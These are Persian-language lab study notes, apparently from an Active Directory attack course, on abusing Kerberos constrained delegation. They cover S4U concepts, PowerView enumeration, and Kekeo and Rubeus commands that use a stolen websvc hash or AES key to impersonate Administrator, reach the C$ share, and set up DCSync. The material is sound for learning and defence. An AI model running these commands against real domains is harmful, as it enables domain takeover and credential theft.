

---

**Delegation محدودشده (Constrained Delegation)**
وقتی روی یک حساب سرویس فعال شود، فقط اجازه‌ی دسترسی به سرویس‌های مشخص روی کامپیوترهای مشخص را به‌عنوان یک کاربر می‌دهد.

یک سناریوی معمول برای استفاده از Delegation محدودشده این است:  
کاربر بدون استفاده از Kerberos به یک وب‌سرویس احراز هویت می‌کند و وب‌سرویس، برای واکشی نتایج بر اساس مجوزهای کاربر، درخواست‌هایی به سرور پایگاه‌داده ارسال می‌کند.

برای شبیه‌سازی هویت کاربر، از **افزونه Service for User (S4U)** استفاده می‌شود که شامل دو بخش است:

- **S4U2self (Service for User to Self):**
- به یک سرویس اجازه می‌دهد تا یک TGS قابل انتقال (forwardable) برای خودش از طرف یک کاربر دریافت کند.
    
- **S4U2proxy (Service for User to Proxy):**
- به یک سرویس اجازه می‌دهد تا از طرف کاربر، یک TGS برای یک سرویس دوم دریافت کند.
    


---

### 🔹 دو بخش S4U

1. **S4U2Self**  
    سرویس میره از KDC یک بلیت (TGS) برای خودش می‌گیره، اما به اسم کاربر.  
    👉 اینطوری می‌تونه وانمود کنه "من به نمایندگی از این کاربر هستم."
    
2. **S4U2Proxy**  
    سرویس بعد از گرفتن بلیت کاربر، می‌تونه از KDC یک بلیت برای یک سرویس **دیگه** بگیره (به اسم همون کاربر).  
    👉 اینجاست که Delegation شکل می‌گیره.

---

**محدودشده (Constrained Delegation)** یعنی وقتی روی یک حساب سرویس فعال شود، آن حساب فقط می‌تواند به سرویس‌های مشخصی روی کامپیوترهای مشخص، به‌جای یک کاربر دسترسی پیدا کند.


📌 مثال:  
کاربر به یک وب‌سرویس وصل می‌شود (حتی بدون Kerberos). بعد وب‌سرویس نیاز دارد از طرف کاربر به یک سرور پایگاه‌داده (Database Server) وصل شود تا اطلاعات لازم را واکشی کند.

برای اینکه وب‌سرویس بتواند **از طرف کاربر** به سرور پایگاه‌داده وصل شود، از یک قابلیت Kerberos به اسم **Service for User (S4U)** استفاده می‌شود که خودش دو بخش دارد:

- **S4U2self:**
- سرویس می‌تواند بلیت Kerberos (TGS) برای خودش بگیرد ولی به اسم کاربر. (یعنی می‌گوید "من از طرف این کاربر هستم، یک بلیت بده.")
    
- **S4U2proxy:**
- سرویس می‌تواند از طرف کاربر، بلیت Kerberos برای یک سرویس دیگر بگیرد. (یعنی می‌گوید "من از طرف این کاربر می‌خواهم به فلان سرویس دوم وصل شوم.")


- کاربر **Joe** به یک وب‌سرویس (که با حساب سرویس **websvc** اجرا می‌شود) با استفاده از یک روش احراز هویت غیرسازگار با Kerberos وارد می‌شود.
    
- وب‌سرویس، به‌عنوان حساب **websvc**، بدون اینکه رمز عبور جو را داشته باشد، از **KDC** یک بلیت برای حساب جو درخواست می‌کند.
    
- **KDC** بررسی می‌کند که روی حساب **websvc** ویژگی `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` فعال باشد و همچنین حساب **Joe** برای Delegation بلاک نشده باشد. اگر همه‌چیز درست باشد، KDC یک بلیت قابل انتقال (forwardable ticket) برای حساب جو صادر می‌کند (**S4U2Self**).
    
- سرویس، این بلیت را دوباره به **KDC** می‌فرستد و یک بلیت سرویس برای سرویس **CIFS/dcorp-mssql.dollarcorp.moneycorp.local** درخواست می‌کند.
    
- **KDC** 
- فیلد `msDS-AllowedToDelegateTo` در حساب **websvc** را بررسی می‌کند. اگر سرویس مورد نظر در این فیلد تعریف شده باشد، یک بلیت سرویس برای **dcorp-mssql** صادر می‌کند (**S4U2Proxy**).
    
- در نهایت، وب‌سرویس می‌تواند به‌عنوان جو (Joe) به سرویس **CIFS** روی **dcorp-mssql** متصل شود و از بلیت Kerberos استفاده کند.

- **S4U2Proxy:**
- وب‌سرویس بعد از گرفتن بلیت اولیه، می‌تواند از طرف کاربر برای یک سرویس دوم هم بلیت بگیرد (مثلاً سرور دیتابیس یا CIFS).
    
- **کنترل امنیتی:**
    
    - شرط اصلی این است که در حساب **websvc** مشخص شده باشد اجازه دارد به کدام سرویس‌ها Delegation انجام دهد (`msDS-AllowedToDelegateTo`).
        
    - این باعث می‌شود وب‌سرویس نتواند به هر سرویس دلخواه وصل شود، فقط به سرویس‌هایی که مدیر سیستم اجازه داده است.


---

**عنوان:** فهرست‌برداری کاربران و رایانه‌هایی که **Delegation محدودشده** برای‌شان فعال است

**با PowerView**

- `Get-DomainUser -TrustedToAuth`  
    → کاربرانی را نمایش می‌دهد که علامت/پرچم `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` روی حساب‌شان ست شده (یعنی حساب سرویس مورد اعتماد برای انجام delegation است).

![[Pasted image 20250923005859.png]]


    
- `Get-DomainComputer -TrustedToAuth`  
    → کامپیوترهایی را نمایش می‌دهد که پرچم `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` دارند.
    

**با ماژول ActiveDirectory (PowerShell رسمی)**

- `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`  
    → همه اشیاء (معمولاً حساب‌های سرویس/کامپیوتر) را برمی‌گرداند که مقدار فیلد `msDS-AllowedToDelegateTo` آنها خالی نیست. این فیلد فهرست سرویس‌هایی را نگهداری می‌کند که برای آن حساب اجازه‌ی **Constrained Delegation** صادر شده است.
    

---


**عنوان:** سوء‌استفاده با Kekeo

- ابتدا لازم است که یا رمز عبور متن‌خام (plaintext) یا هش NTLM / کلیدهای AES در اختیار باشد. در این سناریو، ما قبلاً هش حساب **websvc** را از `dcorp-adminsrv` به‌دست آورده‌ایم.
    
- با استفاده از دستور `asktgt` از مجموعه ابزار **Kekeo**، یک **TGT** درخواست می‌کنیم (مراحل ۲ و ۳ در دیاگرام):
    

```
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

ترجمه و معنی پارامترها:

- `tgt::ask` → درخواست گرفتن **TGT** از KDC.
    
- `/user:websvc` → نام حساب سرویس که می‌خواهیم به جای آن TGT بگیریم.
    
- `/domain:dollarcorp.moneycorp.local` → دامین هدف.
    
- `/rc4:...` → هش NTLM (RC4) مربوط به حساب `websvc` که برای ساخت/امضای درخواست استفاده می‌شود.
    
- سپس با استفاده از `s4u` از Kekeo، یک **TGS** درخواست می‌کنیم (مراحل ۴ و ۵):
    

```
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

ترجمه و معنی پارامترها:

- `tgs::s4u` → استفاده از قابلیت **S4U** برای درخواست **TGS** به نام کاربر هدف.
    
- `/tgt:...kirbi` → مسیر یا فایل/شیء حاوی **TGT** که قبلاً با `asktgt` گرفته‌ایم (فایل kirbi یا مقدار TGT).
    
- `/user:Administrator@dollarcorp.moneycorp.local` → نام کاربری‌ای که می‌خواهیم از طرف او TGS بگیریم (در اینجا Administrator).
    
- `/service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL` → SPN/سرویسی که می‌خواهیم برایش تکت سرویس (TGS) بگیریم (اینجا CIFS روی dcorp-mssql).
    

---

### خلاصهٔ کاری که انجام می‌شود

1. از هش یا credential حساب `websvc` استفاده می‌کنیم تا یک TGT برای `websvc` بگیریم (`asktgt`).
    
2. سپس با آن TGT، با استفاده از مکانیزم S4U (از طریق `tgs::s4u`) از KDC درخواست می‌کنیم که برای کاربر **Administrator** یک TGS برای سرویس CIFS روی `dcorp-mssql` صادر کند.
    
3. اگر KDC و مقادیر msDS-AllowedToDelegateTo و TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION اجازه بدهند، ما در نهایت تکت سرویسی دریافت می‌کنیم که به ما امکان می‌دهد به عنوان Administrator به آن سرویس متصل شویم.
    

---


### عنوان: سوء‌استفاده با Rubeus

ما می‌تونیم از دستور زیر استفاده کنیم (در اینجا هم‌زمان هم TGT و هم TGS درخواست می‌شود):

```
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
1s \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

### ترجمه و توضیح پارامترها

- `Rubeus.exe s4u`  
    → اجرای ماژول S4U در ابزار Rubeus برای گرفتن بلیت به‌نام کاربر هدف یا گرفتن تکت سرویس از طرف کاربر.
    
- `/user:websvc`  
    → حساب سرویسی که از آن به نمایندگی عمل می‌کنیم (حسابی که کلید/هش آن را داریم).
    
- `/aes256:2d84...d7`  
    → کلید AES256 (یا مقدار کلید/هش) مربوط به حساب `websvc` که برای ساخت/امضای درخواست و دریافت TGT استفاده می‌شود.
    
- `/impersonateuser:Administrator`  
    → نام کاربری‌ای که می‌خواهیم نقش (Impersonate) آن را بگیریم؛ در اینجا `Administrator`.
    
- `/msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL`  
    → SPN سرویسی که می‌خواهیم برایش TGS بگیریم (اینجا CIFS روی `dcorp-mssql`).
    
- `/ptt`  
    → Pass-The-Ticket: تکت دریافتی را در نشست فعلی بارگذاری می‌کند (inject می‌کند) تا بلافاصله از آن استفاده شود.
    
- `1s \\dcorp-mssql.dollarcorp.moneycorp.local\c$`  
    → پس از تزریق تکت، اقدام به دسترسی به مسیر شبکه‌ای/شِیر ادمینی (`C$`) روی `dcorp-mssql` می‌کند (اینجا عملاً اتصال و استفاده از تکت برای دسترسی smb را نشان می‌دهد).
    

### خلاصهٔ کاری که انجام می‌شود

1. با داشتن کلید AES مربوط به `websvc`، Rubeus یک TGT/TGS با مکانیزم S4U درخواست می‌کند که اجازهٔ impersonate کاربر `Administrator` برای سرویس CIFS روی `dcorp-mssql` را بدهد.
    
2. اگر KDC و تنظیمات `msDS-AllowedToDelegateTo` و `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` اجازه دهند، تکت سرویس صادر می‌شود.
    
3. با `/ptt` تکت در جلسه فعلی قرار می‌گیرد و سپس با اتصال به `\\dcorp-mssql\c$` عملاً به‌عنوان Administrator به اشتراک ادمینی دسترسی پیدا می‌کنیم.
    


![[Pasted image 20250923010341.png]]
![[Pasted image 20250923010353.png]]
![[Pasted image 20250923010432.png]]



`Senario`

- فهرست‌برداری کاربران در دامنه که برای آنها **Constrained Delegation** فعال است.
    
- برای چنین کاربری، از کنترل‌کننده دامنه (DC) یک **TGT** درخواست کن و برای سرویسی که delegation برای آن پیکربندی شده، یک **TGS** دریافت کن.
    
- بلیت را منتقل کن و به‌عنوان **Domain Admin (DA)** به سرویس دسترسی پیدا کن.
    
- فهرست‌برداری حساب‌های کامپیوتری در دامنه که برای آنها **Constrained Delegation** فعال است.
    
- برای چنین **کامپیوتری**، از DC یک **TGT** درخواست کن.
    
- از **TGS** برای اجرای حملهٔ **DCSync** استفاده کن.